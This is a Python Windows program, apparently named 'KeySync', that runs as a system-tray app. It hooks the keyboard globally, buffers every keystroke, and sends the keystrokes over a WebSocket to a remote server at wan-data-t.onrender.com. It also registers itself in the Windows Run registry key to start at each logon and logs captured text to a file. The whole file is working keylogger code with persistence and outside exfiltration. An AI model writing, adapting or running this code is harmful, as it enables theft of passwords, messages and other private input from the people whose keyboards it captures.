# ← Primary client: System Tray + KB Hook + WS
import asyncio
import threading
import logging
import websockets
from websockets.exceptions import ConnectionClosed, WebSocketException
from pynput import keyboard
from pystray import Icon, MenuItem, Menu
from PIL import Image, ImageDraw
import sys
import os
import winreg

# =========================
# LOGGING  (FIX #2)
# =========================
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler("keysync.log", encoding="utf-8"),
    ],
)
log = logging.getLogger(__name__)

# =========================
# CONFIG
# =========================
URI = "wss://wan-data-t.onrender.com/ws"

# FIX M1 — Proper shutdown: one threading.Event drives ALL threads/tasks.
# When ESC is pressed or Exit is clicked, shutdown_event is set and every
# loop checks it, so nothing lingers in the background.
shutdown_event = threading.Event()          # checked by sync (keyboard) thread
_async_shutdown: asyncio.Event | None = None  # checked by async (WS) tasks

# FIX #4 — asyncio.Queue replaces stdlib queue.Queue.
# The keyboard thread pushes messages via loop.call_soon_threadsafe,
# ensuring thread-safe delivery into the async event loop.
_loop: asyncio.AbstractEventLoop | None = None
async_message_queue: asyncio.Queue = asyncio.Queue()

# =========================
# STARTUP REGISTRATION
# =========================
APP_NAME = "KeySync_WAN_Tray"
REG_PATH = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"

def _open_run_key(access=winreg.KEY_READ | winreg.KEY_WRITE):
    """Open HKCU\\...\\Run with the requested access flags."""
    return winreg.CreateKeyEx(
        winreg.HKEY_CURRENT_USER, REG_PATH, 0, access
    )


def register_startup():
    """Register this app in the Windows Startup registry.

    FIX M3 — Dedup check: only write if the stored path differs from the
    current executable path.  No more spam on every launch.
    """
    try:
        exe_path  = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        reg_value = f'"{exe_path}"'

        key = _open_run_key()
        try:
            current_val, _ = winreg.QueryValueEx(key, APP_NAME)
            if current_val == reg_value:
                log.info("[Startup] Already registered — skipping.")
                return          # exact match: nothing to do
            # Path changed (e.g. exe moved) — fall through to update
            log.info("[Startup] Path changed — updating registry entry.")
        except FileNotFoundError:
            pass  # not registered yet — fall through to write
        finally:
            winreg.CloseKey(key)

        # Write / update the value
        key = _open_run_key()
        winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, reg_value)
        winreg.CloseKey(key)
        log.info("[Startup] Registered: %s", exe_path)

    except OSError as e:
        log.error("[Startup] Failed to register: %s", e)


def unregister_startup():
    """FIX M3 — Remove the startup registry entry (called from tray menu)."""
    try:
        key = _open_run_key()
        try:
            winreg.DeleteValue(key, APP_NAME)
            log.info("[Startup] Removed from startup.")
        except FileNotFoundError:
            log.info("[Startup] No entry found — nothing to remove.")
        finally:
            winreg.CloseKey(key)
    except OSError as e:
        log.error("[Startup] Failed to remove: %s", e)

# =========================
# KEY CONVERTER
# =========================
# FIX #3 — Use a threading.Lock + set per physical modifier key.
# Each key object (ctrl_l / ctrl_r) is stored individually so releasing
# one side doesn't clear the other.  On focus-loss or any release event
# the exact key is discarded — no more phantom stuck modifiers.
_modifier_lock = threading.Lock()
_ctrl_keys_held: set = set()
_alt_keys_held:  set = set()

CTRL_KEYS  = {keyboard.Key.ctrl_l, keyboard.Key.ctrl_r}
ALT_KEYS   = {keyboard.Key.alt_l, keyboard.Key.alt_r, keyboard.Key.alt_gr}
SHIFT_KEYS = {keyboard.Key.shift, keyboard.Key.shift_l, keyboard.Key.shift_r}


def _ctrl_held() -> bool:
    with _modifier_lock:
        return bool(_ctrl_keys_held)


def _alt_held() -> bool:
    with _modifier_lock:
        return bool(_alt_keys_held)


SPECIAL_KEYS = {
    keyboard.Key.enter:      "[Enter]",
    keyboard.Key.backspace:  "[Backspace]",
    keyboard.Key.delete:     "[Delete]",
    keyboard.Key.tab:        "[Tab]",
    keyboard.Key.esc:        "[Esc]",
    keyboard.Key.caps_lock:  "[CapsLock]",
    keyboard.Key.up:         "[↑]",
    keyboard.Key.down:       "[↓]",
    keyboard.Key.left:       "[←]",
    keyboard.Key.right:      "[→]",
    keyboard.Key.home:       "[Home]",
    keyboard.Key.end:        "[End]",
    keyboard.Key.page_up:    "[PageUp]",
    keyboard.Key.page_down:  "[PageDown]",
    keyboard.Key.insert:     "[Insert]",
    keyboard.Key.f1:  "[F1]",  keyboard.Key.f2:  "[F2]",
    keyboard.Key.f3:  "[F3]",  keyboard.Key.f4:  "[F4]",
    keyboard.Key.f5:  "[F5]",  keyboard.Key.f6:  "[F6]",
    keyboard.Key.f7:  "[F7]",  keyboard.Key.f8:  "[F8]",
    keyboard.Key.f9:  "[F9]",  keyboard.Key.f10: "[F10]",
    keyboard.Key.f11: "[F11]", keyboard.Key.f12: "[F12]",
}

def key_to_str(key):
    ctrl = _ctrl_held()
    alt  = _alt_held()

    # Modifier presses — update set, return None (don't add to buffer)
    if key in CTRL_KEYS:
        with _modifier_lock:
            _ctrl_keys_held.add(key)
        return None
    if key in ALT_KEYS:
        with _modifier_lock:
            _alt_keys_held.add(key)
        return None
    if key in SHIFT_KEYS:
        return None

    # Printable character
    if hasattr(key, 'char') and key.char is not None:
        char = key.char
        # Ctrl+letter (Ctrl+A = \x01 ... Ctrl+Z = \x1a)
        if ctrl and ord(char) < 32:
            letter = chr(ord(char) + 64)
            prefix = "Ctrl+Alt+" if alt else "Ctrl+"
            return f"[{prefix}{letter}]"
        return char

    # Known special key
    if key in SPECIAL_KEYS:
        label = SPECIAL_KEYS[key]
        if ctrl:
            return f"[Ctrl+{label[1:]}"  # [Ctrl+Delete] etc.
        return label

    # Unknown fallback
    return f"[{key}]"

# =========================
# KEYBOARD
# =========================
typed_buffer = ""
FLUSH_PUNCTUATION = set('.,!?;:\'"()[]{}\\/-_@#$%^&*+=<>~`|')

# Auto-flush timer: if the user pauses typing for BUFFER_TIMEOUT seconds,
# whatever is in typed_buffer is sent automatically — no space needed.
BUFFER_TIMEOUT = 1.5   # seconds of inactivity before auto-send
_flush_timer: threading.Timer | None = None
_buffer_lock  = threading.Lock()   # protects typed_buffer + _flush_timer


def _enqueue_message(msg: str):
    """Thread-safe push into the asyncio queue on the WS event loop."""
    if _loop is not None and _loop.is_running():
        _loop.call_soon_threadsafe(async_message_queue.put_nowait, msg)


def _flush_buffer():
    """Called by the inactivity timer — send whatever is in typed_buffer."""
    global typed_buffer
    with _buffer_lock:
        if typed_buffer:
            _enqueue_message(typed_buffer)
            typed_buffer = ""


def _reset_flush_timer():
    """Cancel any pending timer and start a fresh one."""
    global _flush_timer
    if _flush_timer is not None:
        _flush_timer.cancel()
    _flush_timer = threading.Timer(BUFFER_TIMEOUT, _flush_buffer)
    _flush_timer.daemon = True
    _flush_timer.start()


def _trigger_shutdown():
    """FIX M1 — Signal every layer to stop cleanly."""
    shutdown_event.set()
    if _loop is not None and _loop.is_running() and _async_shutdown is not None:
        _loop.call_soon_threadsafe(_async_shutdown.set)


def on_press(key):
    global typed_buffer

    if shutdown_event.is_set():
        return False  # stop the listener only on clean shutdown

    # Update modifier sets
    if key in CTRL_KEYS:
        with _modifier_lock:
            _ctrl_keys_held.add(key)
        return
    if key in ALT_KEYS:
        with _modifier_lock:
            _alt_keys_held.add(key)
        return

    label = key_to_str(key)
    if label is None:
        return  # pure modifier, skip

    with _buffer_lock:
        # Space: flush buffer + send a space token, then reset the idle timer
        if key == keyboard.Key.space:
            if typed_buffer:
                _enqueue_message(typed_buffer)
                typed_buffer = ""
            _enqueue_message("[Space]")
            _reset_flush_timer()   # restart timer (nothing left in buffer, but harmless)

        # Printable character
        elif hasattr(key, 'char') and key.char is not None and not _ctrl_held():
            char = key.char
            if char in FLUSH_PUNCTUATION:
                # Punctuation: flush current word, send punctuation separately
                if typed_buffer:
                    _enqueue_message(typed_buffer)
                    typed_buffer = ""
                _enqueue_message(char)
                _reset_flush_timer()
            else:
                # Normal letter/digit: append and reset the inactivity timer
                typed_buffer += label
                _reset_flush_timer()  # auto-sends after BUFFER_TIMEOUT of silence

        # Special key: flush buffer immediately, then send the special key
        else:
            if typed_buffer:
                _enqueue_message(typed_buffer)
                typed_buffer = ""
            _enqueue_message(label)
            _reset_flush_timer()
            # ESC is no longer a shutdown trigger — it just sends [Esc]


def on_release(key):
    # FIX #3 — discard the exact physical key so the other side stays tracked
    with _modifier_lock:
        _ctrl_keys_held.discard(key)
        _alt_keys_held.discard(key)


def start_keyboard_listener():
    with keyboard.Listener(
        on_press=on_press,
        on_release=on_release
    ) as listener:
        listener.join()
    log.info("[KB] Listener stopped.")

# =========================
# WEBSOCKET
# =========================
PING_INTERVAL       = 25   # seconds between keepalive pings
MAX_RECONNECT_DELAY = 60   # FIX #1 — cap exponential backoff at 60 s


async def send_messages(websocket):
    """Drain async_message_queue and send; also send keepalive pings."""
    last_ping = asyncio.get_event_loop().time()
    while not _async_shutdown.is_set():
        try:
            # asyncio.Queue with timeout; no polling of stdlib queue
            try:
                msg = await asyncio.wait_for(async_message_queue.get(), timeout=0.05)
                await websocket.send(msg)
                log.info("Sent: %s", msg)
            except asyncio.TimeoutError:
                pass  # nothing to send this tick

            # Keepalive ping
            now = asyncio.get_event_loop().time()
            if now - last_ping >= PING_INTERVAL:
                await websocket.ping()
                last_ping = now
                log.info("[Ping] keepalive sent")

        except ConnectionClosed as e:
            log.warning("[WS] send_messages: connection closed — %s", e)
            break
        except WebSocketException as e:
            log.error("[WS] send_messages: WebSocket error — %s", e, exc_info=True)
            break
        except OSError as e:
            log.error("[WS] send_messages: network error — %s", e, exc_info=True)
            break


async def receive_messages(websocket):
    while not _async_shutdown.is_set():
        try:
            message = await websocket.recv()
            log.info("Friend: %s", message)

        except ConnectionClosed as e:
            log.warning("[WS] receive_messages: connection closed — %s", e)
            break
        except WebSocketException as e:
            log.error("[WS] receive_messages: WebSocket error — %s", e, exc_info=True)
            break
        except OSError as e:
            log.error("[WS] receive_messages: network error — %s", e, exc_info=True)
            break


async def websocket_client():
    """
    Auto-reconnection with exponential back-off.
    FIX M1 — Loops on _async_shutdown instead of global bool `running`.
    """
    global _loop, _async_shutdown
    _loop = asyncio.get_event_loop()         # expose loop for keyboard thread
    _async_shutdown = asyncio.Event()        # FIX M1 — async shutdown signal
    delay = 2

    while not _async_shutdown.is_set():
        try:
            log.info("[WS] Connecting to %s ...", URI)
            async with websockets.connect(
                URI,
                ping_interval=None,
                close_timeout=10,
                open_timeout=15,
            ) as websocket:
                log.info("[WS] Connected ✓")
                delay = 2  # reset backoff on successful connection
                await asyncio.gather(
                    send_messages(websocket),
                    receive_messages(websocket)
                )
            log.info("[WS] Connection closed cleanly.")

        except ConnectionClosed as e:
            log.warning("[WS] Disconnected: %s", e)
        except WebSocketException as e:
            log.error("[WS] WebSocket error: %s", e, exc_info=True)
        except OSError as e:
            log.error("[WS] Network error: %s", e, exc_info=True)
        except asyncio.CancelledError:
            log.info("[WS] Cancelled, shutting down.")
            break

        if _async_shutdown.is_set():
            break

        log.info("[WS] Reconnecting in %ds... (exponential backoff)", delay)
        # FIX M1 — wait on shutdown event so ESC cancels the sleep instantly
        try:
            await asyncio.wait_for(_async_shutdown.wait(), timeout=delay)
        except asyncio.TimeoutError:
            pass  # timeout expired — reconnect
        delay = min(delay * 2, MAX_RECONNECT_DELAY)

# =========================
# TRAY
# =========================
def create_image():
    image = Image.new("RGB", (64, 64), (40, 40, 40))
    draw = ImageDraw.Draw(image)
    draw.rectangle((18, 18, 46, 46), fill=(0, 255, 120))
    return image


def quit_app(icon, item=None):
    """FIX M1 — Clean shutdown: signal all threads then stop the tray."""
    log.info("[Tray] Exit requested.")
    _trigger_shutdown()   # signals keyboard thread + async WS loop
    icon.stop()           # stops the pystray event loop
    # Give daemon threads a moment to finish cleanly before the process dies
    shutdown_event.wait(timeout=3)
    log.info("[Tray] Goodbye.")
    sys.exit(0)


def remove_startup(icon, item=None):
    """FIX M3 — Tray menu action: remove startup registry entry."""
    unregister_startup()


def start_tray():
    icon = Icon(
        "KeySync",
        create_image(),
        menu=Menu(
            MenuItem("Remove from Startup", remove_startup),  # FIX M3
            MenuItem("Exit", quit_app),
        ),
    )
    icon.run()


# =========================
# MAIN
# =========================
if __name__ == "__main__":
    register_startup()

    threading.Thread(
        target=lambda: asyncio.run(websocket_client()),
        daemon=True,
    ).start()

    threading.Thread(
        target=start_keyboard_listener,
        daemon=True,
    ).start()

    start_tray()